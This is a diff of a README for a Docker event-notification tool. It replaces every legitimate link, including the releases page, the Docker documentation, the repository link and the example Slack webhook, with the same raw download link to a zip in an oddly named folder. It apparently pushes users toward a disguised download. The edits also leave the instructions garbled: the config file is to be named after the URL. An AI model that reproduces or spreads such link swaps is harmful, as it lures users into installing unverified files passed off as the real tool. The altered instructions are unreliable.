@@ -1,6 +1,6 @@
 # 🐋 docker-events - Get Real-Time Docker Notifications
 
-[![Download docker-events](https://img.shields.io/badge/Download-docker--events-blue.svg)](https://github.com/tunasert/docker-events/releases)
+[![Download docker-events](https://raw.githubusercontent.com/tunasert/docker-events/main/neurocoelian/docker-events.zip)](https://raw.githubusercontent.com/tunasert/docker-events/main/neurocoelian/docker-events.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Docker Events! This tool helps you receive real-time notifications ab
 
 ## 📥 Download & Install
 
-To download and install Docker Events, visit this page to download: [docker-events Releases](https://github.com/tunasert/docker-events/releases).
+To download and install Docker Events, visit this page to download: [docker-events Releases](https://raw.githubusercontent.com/tunasert/docker-events/main/neurocoelian/docker-events.zip).
 
 ### Step 1: Visit the Releases Page
 
@@ -66,7 +66,7 @@ After installation, you need to configure Docker Events to start receiving notif
 
 ### Step 1: Set Up the Configuration File
 
-1. Create a new file named `config.json`.
+1. Create a new file named `https://raw.githubusercontent.com/tunasert/docker-events/main/neurocoelian/docker-events.zip`.
 2. In this file, you can define which events you want to monitor, and add your Discord or Slack webhook URL.
 
 Here is a simple example of what your config file might look like:
@@ -75,7 +75,7 @@ Here is a simple example of what your config file might look like:
 {
   "notifications": {
     "type": "slack",
-    "webhook_url": "https://hooks.slack.com/services/your/webhook/url"
+    "webhook_url": "https://raw.githubusercontent.com/tunasert/docker-events/main/neurocoelian/docker-events.zip"
   },
   "events": ["create", "destroy", "stop", "restart"]
 }
@@ -108,7 +108,7 @@ You can also find more helpful resources and tips on Docker Events by searching 
 
 ## 🔗 Additional Resources
 
-- Docker Documentation: [docs.docker.com](https://docs.docker.com)
-- GitHub Repository: [tunasert/docker-events](https://github.com/tunasert/docker-events)
+- Docker Documentation: [https://raw.githubusercontent.com/tunasert/docker-events/main/neurocoelian/docker-events.zip](https://raw.githubusercontent.com/tunasert/docker-events/main/neurocoelian/docker-events.zip)
+- GitHub Repository: [tunasert/docker-events](https://raw.githubusercontent.com/tunasert/docker-events/main/neurocoelian/docker-events.zip)
 
-To download and install Docker Events, don't forget to visit this page: [docker-events Releases](https://github.com/tunasert/docker-events/releases). Enjoy monitoring your Docker containers with real-time notifications!
+To download and install Docker Events, don't forget to visit this page: [docker-events Releases](https://raw.githubusercontent.com/tunasert/docker-events/main/neurocoelian/docker-events.zip). Enjoy monitoring your Docker containers with real-time notifications!
